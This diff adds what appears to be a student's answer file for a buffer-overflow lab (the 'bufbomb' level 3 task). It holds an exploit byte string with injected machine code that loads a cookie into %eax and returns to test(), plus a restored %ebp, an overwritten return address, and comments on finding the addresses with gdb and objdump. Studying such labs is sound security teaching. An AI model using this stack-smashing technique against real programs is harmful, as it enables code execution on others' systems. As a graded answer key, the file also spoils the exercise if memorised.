@@ -1,0 +1,39 @@
+/* Answer */
+68 be 8d 04 08 b8 55 fb cf 17
+c3 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+b0 3b 68 55 58 3b 68 55
+
+/* Explain
+ * Our gold is to return our cookies throught getbuf(),
+ * thus, we can use the %eax property(register that save the
+ * return value) and the **push** statement
+ * at first, disassemble test() and getbuf()
+ * we can find this statement in test():
+ *     call 8048d90 <getbuf>
+ *     mov %eax, %ebx
+ * because we just need to return the cookie value,
+ * so we can put cookie in %eax register(according to
+ * %eax property) and go back to test directly.
+ *     mov $0x17cffb55, %eax // $0x17cffb55 is the cookie value
+ *     push $0x08048dbe // $0x08048dbe is the address below the calling getbuf statement
+ * use command
+ *     gcc -m32 -c lv3s.s
+ *     objdump -d lv3s.o > lv3s.d
+ * we can get the result
+ * because when going back to test(), %ebp's value is changed
+ * so that we should write it back
+ * set a breakpoint in getbuf(), by command:
+ *     print $ebp-0x28 // Find the beginner of buffer
+ *     x/wx $ebp // Get the %ebp's address
+ * we can get the final answer
+ *    68 be 8d 04 08       	// push   $0x8048dbe
+ *    b8 55 fb cf 17       	// mov    $0x17cffb55,%eax
+ *    c3                   	// ret
+ *    00 00 00 00 00 00 00 00 00
+ *    00 00 00 00 00 00 00 00 00 00
+ *    00 00 00 00 00 00 00 00 00 00
+ *    b0 3b 68 55          // %ebp's address
+ *    58 3b 68 55          // the beginning of buffer
+ */
